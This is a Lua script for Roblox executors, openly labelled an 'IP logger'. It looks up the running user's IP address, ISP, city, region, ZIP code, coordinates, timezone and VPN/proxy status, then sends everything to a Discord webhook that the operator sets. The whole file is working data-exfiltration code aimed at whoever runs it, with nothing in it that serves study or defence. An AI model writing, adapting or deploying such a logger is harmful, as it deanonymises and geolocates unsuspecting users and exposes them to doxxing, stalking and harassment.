local WEBHOOK_URL = "" --discord webhook link

local response = request({
    Url = "https://www.ipaddress.my/",
    Method = "GET"
})

if response then
    local jsonStart, jsonEnd = response.Body:find('<pre id="code2".->(.-)</pre>')
    
    if not jsonStart then
        jsonStart, jsonEnd = response.Body:find('<pre.->(.-)</pre>')
    end

    if jsonStart then
        local jsonData = response.Body:sub(jsonStart, jsonEnd)
        jsonData = jsonData:gsub('%b<>', ''):gsub('&quot;', '"'):gsub('&lt;', '<'):gsub('&gt;', '>'):gsub('&amp;', '&') 
        jsonData = jsonData:gsub('<!%-%-.-%-%->', '')
        local success, ipData = pcall(function()
            return game:GetService("HttpService"):JSONDecode(jsonData)
        end)
        
        if success and ipData then
            local embed = {
                title = "Ciel Very Cool Ip Logger for roblox",
                color = 5793266,
                fields = {},
                footer = {
                    text = "Fetched at " .. os.date("%B %d, %Y %I:%M %p")
                }
            }
            local function addField(name, value, inline)
                if value ~= nil and value ~= "" and value ~= "-" then
                    table.insert(embed.fields, {
                        name = name,
                        value = tostring(value),
                        inline = inline or false
                    })
                end
            end
            addField("IP Address", "`"..(ipData.ip or "N/A").."`", true)
            addField("ISP", ipData.isp or "N/A", true)
            addField("Organization", ipData.as or "N/A", true)
            addField("AS Number", ipData.asn or "N/A", true)
            addField("Location", string.format("%s, %s, %s (%s)", 
                ipData.city_name or "N/A", 
                ipData.region_name or "N/A", 
                ipData.country_name or "N/A",
                ipData.country_code or "N/A"), false)
            addField("Coordinates", string.format("Lat: %.4f | Lon: %.4f", 
                ipData.latitude or 0, 
                ipData.longitude or 0), true)
            addField("ZIP Code", ipData.zip_code or "N/A", true)
            addField("Domain", ipData.domain or "N/A", true)
            addField("Net Speed", ipData.net_speed or "N/A", true)
            addField("Usage Type", ipData.usage_type or "N/A", true)
            addField("Timezone", ipData.time_zone or "N/A", true)
            if ipData.time_zone_info then
                addField("Current Time", ipData.time_zone_info.current_time or "N/A", true)
            end
            if ipData.country then
                local countryInfo = {
                    "Capital: "..(ipData.country.capital or "N/A"),
                    "Population: "..tostring(ipData.country.population or "N/A"),
                    "Area: "..tostring(ipData.country.total_area or "N/A").." km²"
                }
                addField("Country Info", table.concat(countryInfo, "\n"), false)
            end
            addField("Is Proxy", ipData.is_proxy and "True" or "False", true)
            addField("Fraud Score", ipData.fraud_score or "0", true)
            if ipData.proxy then
                local proxyInfo = {
                    "VPN: "..(ipData.proxy.is_vpn and "True" or "False"),
                    "TOR: "..(ipData.proxy.is_tor and "True" or "False"),
                    "Data Center: "..(ipData.proxy.is_data_center and "True" or "False")
                }
                addField("Proxy Details", table.concat(proxyInfo, "\n"), false)
            end
            addField("Mobile Brand", ipData.mobile_brand or "N/A", true)
            addField("Elevation", ipData.elevation and tostring(ipData.elevation).."m" or "N/A", true)
            local success, err = pcall(function()
                request({
                    Url = WEBHOOK_URL,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = game:GetService("HttpService"):JSONEncode({
                        embeds = {embed}
                    })
                })
            end)

            if success then
                print("sent")
            else
                warn("failed to send to discord: "..tostring(err))
            end
        else
            warn("cant parse json: "..tostring(ipData))
        end
    else
        warn("no data in response")
    end
else
    warn("http request failed")
end
